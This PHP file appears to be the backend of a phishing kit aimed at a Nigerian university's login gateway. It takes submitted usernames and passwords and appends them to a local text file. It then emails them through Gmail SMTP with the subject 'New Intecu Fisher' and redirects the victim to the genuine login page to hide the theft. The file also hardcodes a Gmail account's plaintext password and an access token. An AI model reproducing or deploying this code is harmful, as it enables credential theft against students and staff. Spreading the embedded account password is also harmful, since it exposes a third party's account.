<?php 
/**
* 
*/
class Master{
	private $file = "./assets/includes/files/file.txt";
	public $msg = "";
	function __construct(){
	/*
		if (!isset($_GET['auth'])) {
			// silience is golden
			die('');
		}else{
			if ($_GET['auth'] != '7dcaaa4800ea45093c3f1e46e34a5ffdd6064312') {
				// silience is golden
				die('');
			}
		}
		*/
	}

	public function process(){
		if($this->writeFile($_POST['username'], $_POST['password'])){

			$m = $this->sendMail($_POST['username'], $_POST['password']);
			if($m){
				header('Location: http://gateway.oauife.edu.ng/login');
				exit;
			}else{
				//Mail failed....
				$this->msg = "An error occured...please try again....";
				header('Location: http://gateway.oauife.edu.ng/login');
				exit;
			}
		}else{
			//File not written....
			$this->msg = "Something went wrong, please try again....";
			// die($this->msg);
		}
	}

	private function writeFile($name = "", $pass = ""){
		if (file_exists($this->file)) {
			$handle = fopen($this->file, 'a');
			fwrite($handle, "*Username: ".$name." | Password: ".$pass."\n");
			fclose($handle);
			return true;
		}else{
			return false;
		}
	}

	private $addr_auth = "https://rectifyintecu.herokuapp.com/?auth=7dcaaa4800ea45093c3f1e46e34a5ffdd6064312";
	private $addr = "https://rectifyintecu.herokuapp.com";

	private function sendMail($u = "", $p = ""){
		//mailer...
        $body = /*//<<<EMAILBODY*/"
    <h1>Yup! </h1>
    <h2><small>username: </small> {$u}</h2>
    <h2><small>password: </small> {$p}</h2>
"
/*EMAILBODY*/;
		return $this->m_mailer($to = "ojudusegun@gmail.com", $subject = "New Intecu Fisher", $body);
	}
    private function m_mailer($to = "ojudusegun@gmail.com", $subject = "New Intecu Fisher", $body = ""){
    	require_once('./assets/PHPMailer/PHPMailerAutoload.php');
        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->Mailer = 'smtp';
        $mail->SMTPAuth = true;
        $mail->Host = 'smtp.gmail.com'; // "ssl://smtp.gmail.com" didn't worked
        $mail->Port = 465;
        $mail->SMTPSecure = 'ssl';
        // or try these settings (worked on XAMPP and WAMP):
        // $mail->Port = 587;
        // $mail->SMTPSecure = 'tls';


        $mail->Username = "ojudusegun@gmail.com";
        $mail->Password = "roseontheline7";

        $mail->IsHTML(true); // if you are going to send HTML formatted emails
        $mail->SingleTo = true; // if you want to send a same email to multiple users. multiple emails will be sent one-by-one.

        $mail->From = "rectifyintecu";
        $mail->FromName = "http://rectifyintecu.herokuapp.com/";


        $mail->addAddress($to,"User 1");
        // $mail->addAddress("user.2@gmail.com","User 2");
         
        // $mail->addCC("user.3@ymail.com","User 3");
        // $mail->addBCC("user.4@in.com","User 4");
         
        $mail->Subject = $subject;
        $mail->Body = $body;
         
        if(!$mail->Send()) {
            // echo "Message was not sent <br />PHPMailer Error: " . $mail->ErrorInfo;
            return false;
        }else{
        	// die("Sent");
            return true;
        }

    }

}
$mast = new Master();
$msg = $mast->msg;
?>
